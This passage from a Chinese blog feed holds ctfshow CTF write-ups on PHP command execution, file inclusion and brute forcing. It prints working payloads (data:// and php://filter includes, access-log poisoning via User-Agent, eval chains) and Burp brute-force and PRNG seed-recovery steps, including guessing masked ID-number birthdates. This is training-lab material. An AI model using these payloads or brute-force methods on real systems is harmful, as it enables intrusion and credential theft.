|\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了一个双引号，不用就行了</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>data:</code> ，可以让用户来控制输入流，当它与包含函数(inlcude,require等)结合时，用户输入的data流会被当作php文件执行</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure><p>也可以通过包含日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>同时抓包修改User-Agent: <code>&lt;?php system(&#39;tac f*&#39;);?&gt;</code><br>成功拿到flag</p></li></ol><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>区别不大</p></li><li><p>构造payload<br>同上。<br>成功拿到flag</p></li></ol><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在文件包含函数后面加了.php，这下不能使用日志包含了。<br>但是仍然能用data协议，因为php的尖括号已经闭合了，所以后面加.php也没用</p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?= `tac f*`;?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>过滤了一堆，但是注意过滤的括号是中文括号，因此除了字母空格还能用括号</li></ol><ul><li><p>localeconv()函数<br>获取数字格式信息。<br>返回包含本地化数字和货币格式信息的关联数组。<br>其中第一位返回小数点(.)，这个正是我们需要的<br><a href="https://www.php.net/manual/zh/function.localeconv.php">localeconv()函数的详细信息</a></p></li><li><p>pos()函数<br>current() 的别名<br>返回数组中的当前值</p></li><li><p>scandir()函数<br>列出指定路径中的文件和目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="keyword">string</span> <span class="variable">$directory</span>, <span class="keyword">int</span> <span class="variable">$sorting_order</span> = SCANDIR_SORT_ASCENDING, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">array</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>返回 array，包含有 directory 中的文件和目录。</p></li></ul><p>返回值<br>成功则返回包含有文件名的 array，如果失败则返回 false。如果 directory 不是个目录，则返回布尔值 false 并生成一条 E_WARNING 级的错误。</p><ul><li><p>array_reverse()函数<br>返回单元顺序相反的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reverse</span>(<span class="keyword">array</span> <span class="variable">$array</span>, <span class="keyword">bool</span> <span class="variable">$preserve_keys</span> = <span class="literal">false</span>): <span class="keyword">array</span></span><br></pre></td></tr></table></figure><p>array_reverse() 接受数组 array 作为输入并返回一个单元为相反顺序的新数组。</p></li><li><p>next()函数<br>将数组中的内部指针向前移动一位</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="keyword">array</span>|<span class="keyword">object</span> &amp;<span class="variable">$array</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>next() 和 current() 的行为类似，只有一点区别，在返回值之前将内部指针向前移动一位。这意味着它返回的是下一个数组单元的值并将数组指针向前移动了一位。或当没有更多单元时返回 false。</p></li></ul><p>pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。<br>为了得到倒数第二个元素，将数组逆序再将指针调整到下一个。</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure></li></ol><p>或者可以使用另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">1=system(&#x27;tac f*&#x27;);</span><br></pre></td></tr></table></figure><p>成功拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;前进，前进，不能停下脚步！&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="命令执行" scheme="http://example.com/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-爆破</title>
    <link href="http://example.com/2023/01/13/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2023/01/13/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/</id>
    <published>2023-01-12T16:00:00.000Z</published>
    <updated>2023-01-14T13:36:14.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于爆破，我的能力还非常不足，虽说是最后手段，但尽量不要有短板比较好。</p><span id="more"></span><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><p>打开页面后，是一个需要输入用户名和密码的网页，随便填写了用户名admin,密码123后，开始抓包。<br>抓包后送到Repeater进行分析，发现有一个 <code>Authorization: Base YWRtaW46MTIz</code><br>将后半段明显加密的部分送到Decoder进行分析，发现是Base64加密，解密后的内容是: <code>admin:123</code><br>那么接下来就是到Intruder进行爆破</p><ul><li><p>Positions处<br>如果已经有符号了先Clear,再在密文两边Add</p></li><li><p>Payloads处<br>在Payload Options [Simple List]处Load从ctfshow的web21处下载的字典<br>在Payload Processing处点击Add,选择Add prefix,输入 <code>admin:</code> 。因为我们已经知道用户名和格式是这个了，这样可以提高效率。<br>再次点击Add，选择Encode，再选择Base64-encode,因为我们之前已经验证了是Base64加密。<br>把最后的URL-encode these characters的勾选取消，因为会导致编码错误。</p></li></ul><p>如果嫌默认线程10比较慢的话，可以在Resource Pool下自定义线程和延迟时间等等。</p><p>接下来就是Start Attack，稍等一下，然后找到响应为200或长度与其它不同的包，找响应，即可拿到flag。</p><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><p>可以用这个网站在线爆破子域名:<a href="http://z.zcjun.com/">http://z.zcjun.com/</a><br>不过爆破不出，子域名的flag在vip.ctf.show里。<br>在标签上即可拿到flag</p><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>从题可以看出，我们需要通过GET方式传入一个名为token的参数，要求是token参数的md5值的第1位&#x3D;第14位&#x3D;第17位，并且取得该md5值的第1位，第14位，第17位的整数值相加再除以md5值的第1位&#x3D;该md5值的第31位。<br>如果以上条件均满足，则能取得flag。由于条件比较宽松，我们可以直接用burp爆破，线程调高一点，直接从1-10000爆破，可以发现，数字422和1202均满足条件。<br>或者写一个PHP脚本，如下所示：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s1</span> = <span class="string">&#x27;1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZqwertyuiopasdfghjklzxcvbnm&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span>&lt;<span class="number">62</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">0</span>; <span class="variable">$k</span>&lt;<span class="number">62</span>; <span class="variable">$k</span>++)&#123;</span><br><span class="line">        <span class="variable">$t3</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$s1</span>[<span class="variable">$j</span>].<span class="variable">$s1</span>[<span class="variable">$k</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t3</span>, <span class="number">31</span>,<span class="number">1</span>))) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;token=&quot;</span>.<span class="variable">$s1</span>[<span class="variable">$j</span>].<span class="variable">$s1</span>[<span class="variable">$k</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这样可以得到3j和ZE满足条件。<br>又或者写一个Python脚本，如下所示：<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b = (<span class="built_in">str</span>(i) + <span class="built_in">str</span>(j)).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        m = hashlib.md5(b).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">1</span>:<span class="number">2</span>] == m[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> m[<span class="number">14</span>:<span class="number">15</span>] == m[<span class="number">17</span>:<span class="number">18</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>) &gt; <span class="number">0</span> <span class="keyword">and</span> ((<span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(m[<span class="number">14</span>:<span class="number">15</span>], <span class="number">16</span>) + <span class="built_in">int</span>(m[<span class="number">17</span>:<span class="number">18</span>], <span class="number">16</span>)) / <span class="built_in">int</span>(m[<span class="number">1</span>:<span class="number">2</span>], <span class="number">16</span>)) == <span class="built_in">int</span>(m[<span class="number">31</span>:<span class="number">32</span>], <span class="number">16</span>):</span><br><span class="line">                <span class="built_in">print</span>(b)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>输出结果如上<br>因此可以轻松拿到flag</li></ol><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这段PHP脚本检查URL中是否设置了一个GET参数”r”。如果设置了，它将”r”参数的值赋给变量$r。然后使用值372619038种植Mersenne Twister随机数生成器，并使用mt_rand（）生成一个随机数。</li></ol><p>然后它将$r变量的值与生成的随机数进行比较，如果它们相等，则打印标记。如果未设置”r”参数，则会突出显示脚本的源代码并将命令 <code>&#39;result &#39;cat /proc/version&#39;</code> 打印到屏幕上。</p><p>只要知道了种子372619038和使用的mt_rand，就可以知道生成的伪随机数为1155388967(不同PHP版本得出的值可能不同)，这是一个固定值。在开发中尽量不要设置种子。<br>因此轻松拿到flag</p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>本题的考点是，只要知道随机数的值，就有可能反推出种子。</li></ol><ul><li>hexdec()函数<br>十六进制转换为十进制<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="keyword">string</span> <span class="variable">$hex_string</span>): <span class="keyword">int</span>|<span class="keyword">float</span></span><br></pre></td></tr></table></figure>返回与 hex_string 参数所表示的十六进制数等值的的十进制数。hexdec() 将一个十六进制字符串转换为十进制数。<br>hexdec() 会忽略它遇到的任意非十六进制的字符。自 PHP 7.4.0 起，弃用使用任何无效字符。</li></ul><p>这段PHP脚本检查URL中是否设置了一个GET参数”r”。如果设置了，它将”r”参数的值赋给变量$r。然后使用flag的md5值的前8个字符种植Mersenne Twister随机数生成器，并使用mt_rand（）生成一个随机数。<br>然后它将$r变量减去生成的随机数，并将结果存储在$rand变量中。<br>如果$rand变量等于0，它将检查’token’ cookie是否具有两个由mt_rand（）生成的随机数的和的值。如果cookie值匹配，则会打印$flag的值。如果$rand变量不等于0，则会打印$rand变量的值。</p><p>首先，我们让r为0，这样便能够打印出伪随机数的负值，我们知道了伪随机数的值后，需要通过一个工具来逆推出种子值。</p><ol start="2"><li>使用工具逆推种子值<br>这个<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a>工具对于逆推mt_srand的种子值很有帮助。<br>使用kali,进入页面后，下载红色方框标注的位置：<br><img src="/simg/web25_1.png" alt=" "><br>下载好压缩包后进行提取，或通过命令行进入压缩包目录后进行如下操作：<br><code>tar zxvf php_mt_seed-4.0.tar.gz</code><br>由于安装包不是最新的，我们需要进行如下操作：<br><code>cd php_mt_seed-4.0</code><br><code>make</code><br><code>ls</code><br>我们会发现多出来一个用其它颜色标注的 <code>php_mt_seed</code><br>之后提升权限（如果不可以，则换成管理员身份），我们需要进行如下操作：<br><code>cd ..</code><br><code>chmod 777 php_mt_seed-4.0</code><br>最后再进入目录：<br><code>cd ./php_mt_seed-4.0</code><br>接下来就能够进行逆推种子了，我们进行如下操作：<br><code>time ./php_mt_seed 1537148198</code><br>在这个操作中，可能会生成版本不同的多个种子值。由于本题的PHP版本为7.3.11，我们就只看7.1+版本的种子值。<br>将种子值代入PHP脚本：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x00d06668</span>);</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br></pre></td></tr></table></figure>因为Cookie需要的是第2个和第3个随机数之和，于是我们的脚本只需要输出2，3随机数之和即可。<br>经过多次尝试后，终于找到了正确的种子值，也成功拿到了flag。</li></ol><h1 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h1><p>代码逻辑有问题，直接抓包即可拿到flag</p><h1 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h1><ol><li>收集信息<br>打开页面后，我们发现需要学号和密码才能登录，而这两者我们都不知道。<br>然后还发现了录取名单和学生学籍查询系统，分别打开后，我们发现：<br>录取名单里出现了个人信息，姓名和身份证号，但是身份证号的中间8位被隐藏了。<br>学生学籍查询系统里可以根据姓名和身份证号查询学号。<br>于是我们的目标在于破解身份证号，然后用查询系统查询学号和密码。<br>那么，要破解身份证号，我们首先要搞清身份证号的组成规则：</li></ol><p>1.2位表示省（自治区、直辖市、特别行政区）。<br>3.4位表示市（地级市、自治州、地区、盟及直辖市所属区和县的汇总码）<br>5.6位表示县（区、县级市、旗）<br>7-14（身份证号码第七位到第十四位）表示编码对象出生的年、月、日，<br>15.16位表示所在地的派出所的代码。<br>17位标识性别：奇数表示男性，偶数表示女性。<br>18位为校验码</p><p>根据组成规则可知，我们要爆破的即为出生信息，那么将查询系统进行抓包，然后送到Intruder<br>p的后面确定为爆破位置，然后Payloads下的Payload Sets的Payload type设置为Dates，时间从1990到2000，位置从1到31，格式设置为yyyyMMdd<br>然后在Payload 